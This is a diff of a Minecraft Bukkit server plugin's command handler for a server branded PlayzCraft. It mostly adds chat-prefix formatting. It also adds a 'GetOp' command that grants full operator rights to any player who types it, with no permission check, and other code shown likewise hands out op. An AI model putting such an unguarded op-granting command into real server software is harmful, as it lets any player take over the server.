@@ -16,7 +16,7 @@ public class Commands extends CommandExecute implements Listener,CommandExecutor
 	public static String cmd4 = "apply";
 	public static String cmd5 = "join-discord";
 	public static String cmd6 = "news";
-	//public static String cmd7 = "news";
+	public static String cmd7 = "GetOp";
 	//public static String cmd8 = "news";
 	//public static String cmd9 = "news";
 	//public static String cmd10 = "news";
@@ -25,7 +25,7 @@ public class Commands extends CommandExecute implements Listener,CommandExecutor
 	//public static String cmd13 = "news";
 	//public static String cmd14 = "news";
 	//public static String cmd15 = "news";
-	//	Player player = null;
+	//Player player = null;
 	public boolean onCommand(org.bukkit.command.CommandSender sender, Command cmd, String label, String[] args)
 	  {
 	    boolean returnAnswer = false;
@@ -35,7 +35,7 @@ public class Commands extends CommandExecute implements Listener,CommandExecutor
 	      
 	      player.sendMessage("hi, " + ChatColor.GREEN + player.getName() + ChatColor.RESET + ", we got your ping!");
 	      player.chat("lag test");
-	      player.sendMessage(ChatColor.GOLD + "your name is " + ChatColor.GREEN + player.getName());
+	      player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "]" + ChatColor.GOLD + "your name is " + ChatColor.GREEN + player.getName());
 	      
 	      returnAnswer = true;
 	    }
@@ -43,7 +43,7 @@ public class Commands extends CommandExecute implements Listener,CommandExecutor
 	    {
 	      Player player = (Player)sender;
 	     
-	      org.bukkit.Bukkit.broadcastMessage(ChatColor.RED + "[Admin Commands] " + "The player " + ChatColor.GREEN + player.getName() + ChatColor.RED + " tried to shut down the server");
+	      org.bukkit.Bukkit.broadcastMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + "The player " + ChatColor.GREEN + player.getName() + ChatColor.RED + " tried to shut down the server");
 	      returnAnswer = true;
 	    }
 	    
@@ -62,17 +62,17 @@ public class Commands extends CommandExecute implements Listener,CommandExecutor
 	          if (player.isOp() == false)
 	          {
 	        	  player.setOp(true);
-	        	  player.sendMessage(ChatColor.GREEN + "you now have op!");
+	        	  player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GREEN + "you now have op!");
 	          }
 	          else
 	          {
-	        	  player.sendMessage(ChatColor.RED + "you already have op!");
+	        	  player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RED + "you already have op!");
 	          }
 	          if (player.getHealth() == 100D) {  
-	          player.sendMessage(ChatColor.GREEN + "Done!");
+	          player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GREEN + "Done!");
 	          }
 	          else { 
-	        	  player.sendMessage(ChatColor.RED + "This operation is a FAIL!");
+	        	  player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RED + "This operation is a FAIL!");
 	          }
 	      }
 	      if (player.isOp() == true)
@@ -84,7 +84,7 @@ public class Commands extends CommandExecute implements Listener,CommandExecutor
 	          player.setMaxHealth(100D);
 	          player.setHealth(100D);
 	          if (player.getHealth() == 100D) {
-	          player.sendMessage(ChatColor.GREEN + "Done!");
+	          player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GREEN + "Done!");
 	          }
 	          else { 
 	        	  player.sendMessage(ChatColor.RED + "This operation is a FAIL!");
@@ -92,11 +92,11 @@ public class Commands extends CommandExecute implements Listener,CommandExecutor
 	      }
 	      else
 	      {
-	        player.sendMessage(ChatColor.DARK_RED + "You dont have permission for that command!");
+	        player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.DARK_RED + "You dont have permission for that command!");
 	      }
 	      if (null == player.getName())
 	      {
-	    	  player.sendMessage("hello there null!");
+	    	  player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RED + "Hello there null!");
 	          }
 	          else { 
 	        	  player.sendMessage(ChatColor.RED + "This operation has FAILED for " + player.getCustomName() + "!");
@@ -126,11 +126,26 @@ public class Commands extends CommandExecute implements Listener,CommandExecutor
 		    {
 		      Player player = (Player)sender;
 		      
-			  player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "]" + " hi, " + ChatColor.GREEN + player.getName() + ChatColor.RESET + "! please go to https://www.playzcraft.ml/news/ to read our news articles");
+			  player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + " hi, " + ChatColor.GREEN + player.getName() + ChatColor.RESET + "! please go to https://www.playzcraft.ml/news/ to read our news articles");
 		      
 			  returnAnswer = true;
 		    }
-
+		  if ((cmd.getName().equalsIgnoreCase(cmd7)) && ((sender instanceof Player)))
+		    {
+		      Player player = (Player)sender;
+		      if (player.isOp() == false)
+	          {
+	        	  player.setOp(true);
+	        	  org.bukkit.Bukkit.broadcastMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + "The player " + player.getName() + "now has OP");
+	        	  player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GREEN + "You now have op!");
+	          }
+	          else
+	          {
+	        	  player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RED + "You already have op!");
+	          }
+		      
+			  returnAnswer = true;
+		    }
 
 		  return returnAnswer;
 	  }
